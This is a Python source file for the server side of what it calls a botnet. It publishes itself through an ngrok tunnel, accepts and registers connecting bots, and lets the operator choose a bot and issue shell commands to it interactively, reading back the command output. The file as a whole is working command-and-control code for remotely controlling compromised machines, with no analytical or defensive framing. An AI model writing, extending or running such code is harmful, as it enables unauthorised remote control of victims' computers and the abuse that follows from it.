import sys
from prototype import BotnetInterface, Envelope, Peer, socket, timeout, AF_INET, SOCK_STREAM
from prototype import Menu


class Server:
    interface: BotnetInterface
    connections: list = []
    online: bool
    config: dict

    def __init__(self):
        self.interface = BotnetInterface(insocket=socket(AF_INET, SOCK_STREAM))
        self.interface.distribute()
        self.config = self.interface.config

    def bind_listen(self):
        self.interface.bind(('0.0.0.0', self.config.get('incoming').get('port')))
        print("[*] tcp socket is online")
        self.interface.listen(self.config.get('incoming').get('backlog'))
        print('[*] waiting for incoming connections (up to %d)' % self.config.get('incoming').get('backlog'))

    def accept(self):
        conn, addr = self.interface.accept()
        print('[+] new connection from %s:%s' % addr)
        envelope: Envelope = self.interface.receive(connection=conn)
        cd = Peer(peer_id=envelope.DataText, peer=conn, address=addr, online=True)
        self.connections.append(cd)
        envelope = Envelope(data=True)
        self.interface.send(data=envelope, connection=cd.Socket)
        return True

    def send(self, connection, data):
        self.interface.send(data=data, connection=connection)

    def receive(self, connection):
        return self.interface.receive(connection=connection)

    def run(self):
        Menu.welcome()
        print("[*] ngrok tunnel %s is running" % self.interface.tunnel.public_url)
        self.bind_listen()
        while True:
            try:
                try:
                    self.interface.incoming.settimeout(60)
                    status = self.accept()
                    if status:
                        _ = input('[!] interact? (Y/n)')
                        if 'y' in _.lower():
                            raise KeyboardInterrupt()
                        else:
                            continue
                except timeout:
                    continue
            except KeyboardInterrupt:
                peer: Peer = Menu.refresh_connections_list(self.connections)
                envelope: Envelope = self.receive(peer.Socket)
                print("[%s] is now %s" % (peer.Id, envelope.DataText))
                while True:
                    self.send(peer.Socket, "")
                    envelope: Envelope = self.receive(peer.Socket)
                    stdout = envelope.DataText.decode() if isinstance(envelope.DataText, bytes) else envelope.DataText
                    sys.stdout.write(stdout)
                    stdin = input()
                    if stdin == 'exit':
                        break
                    self.send(peer.Socket, stdin)
